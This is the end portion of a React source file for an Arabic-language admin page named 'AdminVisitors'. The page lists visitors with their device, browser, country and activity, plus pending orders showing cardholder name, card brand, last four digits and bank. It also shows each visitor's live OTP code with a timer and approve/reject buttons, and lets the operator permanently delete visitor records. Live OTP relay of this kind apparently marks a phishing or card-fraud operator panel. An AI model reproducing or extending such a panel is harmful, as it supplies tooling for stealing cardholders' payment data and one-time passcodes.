                          <div key={order.id} className="rounded-xl bg-gradient-to-l from-amber-50/80 to-orange-50/50 border border-amber-200/60 p-2.5">
                            <div className="flex items-center gap-1.5 mb-1">
                              <CreditCard className="w-3.5 h-3.5 text-amber-500 shrink-0" />
                              <span className="text-[10px] text-slate-700 flex-1 truncate font-bold">
                                {order.cardholder_name || order.email || "زائر"}
                              </span>
                              <span className="text-[10px] font-bold text-amber-600">{order.total} ر.س</span>
                            </div>
                            <div className="flex items-center gap-1.5 mb-2 mr-[22px]">
                              <span className="text-[9px] text-slate-500">
                                {order.card_brand} •••• {order.card_last4}
                              </span>
                              {order.bank_name && <span className="text-[9px] text-slate-400">| {order.bank_name}</span>}
                            </div>
                            <div className="flex gap-2">
                              <button
                                onClick={(e) => approveOrderInline(order.id, e)}
                                className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg bg-gradient-to-r from-emerald-500 to-emerald-600 text-white text-[10px] font-bold hover:from-emerald-600 hover:to-emerald-700 active:scale-[0.97] transition-all shadow-sm shadow-emerald-500/20"
                              >
                                <CheckCircle className="w-3.5 h-3.5" /> موافقة
                              </button>
                              <button
                                onClick={(e) => rejectOrderInline(order.id, e)}
                                className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg bg-gradient-to-r from-red-500 to-red-600 text-white text-[10px] font-bold hover:from-red-600 hover:to-red-700 active:scale-[0.97] transition-all shadow-sm shadow-red-500/20"
                              >
                                <XCircle className="w-3.5 h-3.5" /> رفض
                              </button>
                            </div>
                          </div>
                        ))}
                      </div>
                    );
                  })()}

                  {/* Inline OTP approve/reject buttons */}
                  {(() => {
                    const vPendingOtps = getVisitorPendingOtps(selected);
                    if (!vPendingOtps.length) return null;
                    return (
                      <div className="px-3 pb-2 space-y-1.5">
                        {vPendingOtps.map(otp => (
                          <div key={otp.id} className="rounded-xl bg-gradient-to-l from-violet-50/80 to-purple-50/50 border border-violet-200/60 p-2.5">
                            <div className="flex items-center gap-1.5 mb-2">
                              <Shield className="w-3.5 h-3.5 text-violet-500 shrink-0" />
                              <span className="text-[10px] text-slate-600 flex-1 font-semibold">
                                🔐 OTP: {otp.otp_code}
                              </span>
                              <OtpWaitTimer createdAt={otp.created_at} />
                            </div>
                            <div className="flex gap-2">
                              <button
                                onClick={(e) => approveOtpInline(otp.id, e)}
                                className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg bg-gradient-to-r from-emerald-500 to-emerald-600 text-white text-[10px] font-bold hover:from-emerald-600 hover:to-emerald-700 active:scale-[0.97] transition-all shadow-sm shadow-emerald-500/20"
                              >
                                <CheckCircle className="w-3.5 h-3.5" /> قبول
                              </button>
                              <button
                                onClick={(e) => rejectOtpInline(otp.id, e)}
                                className="flex-1 flex items-center justify-center gap-1.5 py-2 rounded-lg bg-gradient-to-r from-red-500 to-red-600 text-white text-[10px] font-bold hover:from-red-600 hover:to-red-700 active:scale-[0.97] transition-all shadow-sm shadow-red-500/20"
                              >
                                <XCircle className="w-3.5 h-3.5" /> رفض
                              </button>
                            </div>
                          </div>
                        ))}
                      </div>
                    );
                  })()}

                  {/* Visitor info in hero */}
                  <div className="px-3 pb-2">
                    <div className="grid grid-cols-4 gap-1">
                      {[
                        { label: "الجهاز", value: selected.device === "mobile" ? "📱" : "🖥", sub: selected.device === "mobile" ? "جوال" : "كمبيوتر", color: "from-violet-50 to-purple-50", borderColor: "border-violet-100/60" },
                        { label: "المتصفح", value: "🌐", sub: selected.browser, color: "from-sky-50 to-cyan-50", borderColor: "border-sky-100/60" },
                        { label: "الدولة", value: countryFlag(selected.country), sub: selected.country, color: "from-emerald-50 to-green-50", borderColor: "border-emerald-100/60" },
                        { label: "النشاط", value: "⏱", sub: getTimeDiff(selected.last_seen), color: "from-amber-50 to-orange-50", borderColor: "border-amber-100/60" },
                      ].map(info => (
                        <div key={info.label} className={`bg-gradient-to-br ${info.color} rounded-lg p-1.5 border ${info.borderColor} text-center`}>
                          <span className="text-[14px] leading-none">{info.value}</span>
                          <p className="text-[8px] font-semibold text-slate-600 mt-0.5 truncate">{info.sub}</p>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Scrollable Content */}
                   <div className="flex-1 overflow-y-auto p-3 space-y-3">


                    {/* Toggle all sections */}
                    <button onClick={toggleAllSections} className="w-full flex items-center justify-center gap-1.5 py-1.5 rounded-lg bg-slate-50 text-slate-500 text-[10px] font-medium hover:bg-slate-100 transition-colors">
                      {allOpen ? <><ChevronUp className="w-3 h-3" /> طي الكل</> : <><ChevronDown className="w-3 h-3" /> فتح الكل</>}
                    </button>

                    {renderTimeline(true)}

                    <button
                      onClick={() => deleteSingle(selected.id)}
                      className="w-full flex items-center justify-center gap-1.5 py-2 rounded-lg bg-red-50 text-red-500 text-[11px] font-medium hover:bg-red-100 transition-colors"
                    >
                      <Trash2 className="w-3.5 h-3.5" /> مسح الزائر
                    </button>
                  </div>
                </div>
              )}
            </SheetContent>
          </Sheet>
        </div>
      </div>

      {/* Dialog تأكيد الحذف */}
      <AlertDialog open={!!confirmDelete} onOpenChange={open => !open && setConfirmDelete(null)}>
        <AlertDialogContent dir="rtl" className="max-w-sm">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-right">تأكيد الحذف النهائي</AlertDialogTitle>
            <AlertDialogDescription className="text-right">
              {confirmDelete?.type === "all"
                ? "هل أنت متأكد من حذف جميع الزوار نهائياً؟ لا يمكن التراجع عن هذا الإجراء."
                : confirmDelete?.type === "selected"
                ? `هل أنت متأكد من حذف (${selectedIds.size}) زائر نهائياً؟ لا يمكن التراجع عن هذا الإجراء.`
                : "هل أنت متأكد من حذف هذا الزائر نهائياً؟ لا يمكن التراجع عن هذا الإجراء."}
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter className="flex gap-2 sm:flex-row-reverse">
            <AlertDialogCancel className="mt-0">إلغاء</AlertDialogCancel>
            <AlertDialogAction
              onClick={handleConfirmPermanentDelete}
              className="bg-red-500 text-white hover:bg-red-600"
            >
              حذف نهائي
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
};

export default AdminVisitors;
